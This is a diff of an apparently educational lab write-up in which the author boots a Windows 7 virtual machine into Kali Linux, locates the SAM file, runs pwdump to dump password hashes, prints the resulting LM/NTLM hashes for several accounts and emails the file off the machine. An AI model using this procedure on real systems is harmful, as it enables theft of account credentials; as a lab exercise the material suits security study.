@@ -64,11 +64,29 @@ Before the next step I need to introduce the IDE Controller of Virtual Box. Usua
 
 I downloaded Download kali-linux iso and I went to storage in settings of Windows 7 virtual machine.  settings -> General -> Basic, change the Version to Other Windows (64 bit). And then I went to Settings -> Storage where I can set up the attibutes of IDE Controller. Set kali-linux as the IDE Primary Master and set the windows 7 as IDE Primary Slave. 
 
+![Change windows version]()
+
+
 I opened the windows 7 virtual machine and it appeared as the interface of kali-linux. Now the hard disk of the Windows 7 virtual machine is a part of the hard disk of kali linux. I located the SAM file in media/root/Windows 7/Windows/systems32/cinfig. 
 
 I used the terminal of kali linux to run pwdump on the SAM file and put the output in a txt tile named WinHash.txt. 
 
 ```pwdump SYSTEM SAM > /root/Desktop/WinHash.txt```
+
+the content of WinHash.txt
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+sshd_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
+user1:1008:8c6f5d02deb21501aad3b435b51404ee:e0fba38268d0ec66ef1cb452d5885e53:::
+user2:1009:ae6e1b1fccb24d5b65fa44e2fc64e931:7d0305bc1509a6b5cdf89c5ff92b2a5b:::
+user3:1010:9677f4a0eebc005cd834de725e83d830:e947f43d95b5bcbc367ab8d81b23cf2a:::
+user4:1011:e9739fe1a9e85af587c394d748ef4541:ff13d5238f9d1eb8c683a42b5143f3b5:::
+user5:1012:64a75169bfeba9f987c394d748ef4541:1e4da16751efa2c6538c0c721fd0259f:::
+```
 
 Then I tranfered the WinHash.txt to local computer through email. 
 
